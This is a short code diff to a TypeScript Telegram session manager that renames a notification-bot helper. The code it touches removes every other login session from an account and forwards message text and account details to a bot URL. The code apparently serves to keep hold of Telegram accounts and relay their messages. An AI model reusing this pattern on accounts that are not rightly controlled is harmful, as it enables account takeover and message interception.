@@ -15,7 +15,7 @@ import { EntityLike } from 'telegram/define';
 import { contains } from '../../utils';
 import { parseError } from '../../utils/parseError';
 import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
-import { ppplbot } from '../../utils/logbots';
+import { notifbot } from '../../utils/logbots';
 
 class TelegramManager {
     private session: StringSession;
@@ -517,7 +517,7 @@ class TelegramManager {
             if (this.isAuthMine(auth)) {
                 continue;
             } else {
-                await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
+                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                 await this.resetAuthorization(auth);
             }
         }
@@ -745,7 +745,7 @@ class TelegramManager {
                 //         parseError(error)
                 //     }
                 // } else {
-                await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(event.message.text)}`);
+                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(event.message.text)}`);
                 // await event.message.delete({ revoke: true });
                 // }
             }
